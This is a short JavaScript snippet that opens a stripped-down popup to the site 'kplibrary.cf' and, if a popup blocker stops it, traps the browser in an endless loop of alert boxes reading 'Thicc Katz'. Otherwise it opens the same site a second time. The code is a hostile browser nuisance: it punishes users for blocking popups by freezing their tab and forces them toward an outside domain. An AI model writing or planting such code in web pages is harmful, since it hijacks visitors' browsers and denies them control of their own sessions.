var windowName = 'userConsole';
var popUp = window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
if (popUp == null || typeof(popUp) == 'undefined') {
  while (true) {
    alert("Thicc Katz")
  }
} else {
  window.open("kplibrary.cf");
}
